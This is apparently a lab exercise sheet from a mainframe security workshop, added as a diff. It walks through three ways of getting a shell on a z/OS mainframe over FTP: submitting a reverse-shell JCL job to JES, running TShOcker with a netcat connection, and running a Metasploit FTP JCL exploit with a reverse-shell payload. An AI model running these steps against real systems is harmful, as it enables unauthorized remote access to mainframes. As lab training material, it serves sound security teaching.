@@ -1,0 +1,36 @@
+
+FTP SHELLS Three ways:
+
+1) Your own JCL 
+- Connect with FTP and download REVUSSC (or skip this and look in folder Extra/Shells)
+- Logon with FTP
+- cd in to the 'LABS' folder: cd LABS
+- Downoad USSREVC: get USSREVC ussrevc.jcl
+- Using whatever editor you like change the port to 443:
+  - on line 28 replace: sin.sin_port=htons(31337); with sin.sin_port=htons(443);
+- Using NetEBCDICat.py open a listener on port 443 (in a seperate window)
+- Now reconnect with FTP. After loging on type:
+  - site file=jes
+  - put ussrevc.jcl
+- You should eventually see a connection back in to NetEBCDICat.py
+- CONGRATS! You got a shell through FTP!
+
+2) Using TShOcker:
+- Using the tool TShOcker issue the command: 
+      ./TShOcker.py -l --lport <pick some port above 10224> <mainframe ip> <userid> <password>
+- In your Lab VM connect to the mainframe with netcat: nc -v <mainframe ip> <some port you picked>
+- Issue some commands
+- STICKER: What is the location of the RACF database (as told to you by this limited shell)
+
+3) Using Metasploit:
+- Launch metasploit: msfconsole
+- Use the FTP Creds exploit: use exploit/mainframe/ftp/ftp_jcl_creds
+- Set the payload to reverse shell: set payload cmd/mainframe/reverse_shell_jcl
+- Set FTPUSER and FTPPASS to your username and password: 
+  - set FTPUSER <userid>
+  - set FTPPASS <password>
+- Set RHOST to the mainframe ip: set RHOST <mainframe ip>
+- Set your host: set LHOST <your machine ip address>
+- Then run the exploit: run
+- Notice that this is a UNIX shell
+
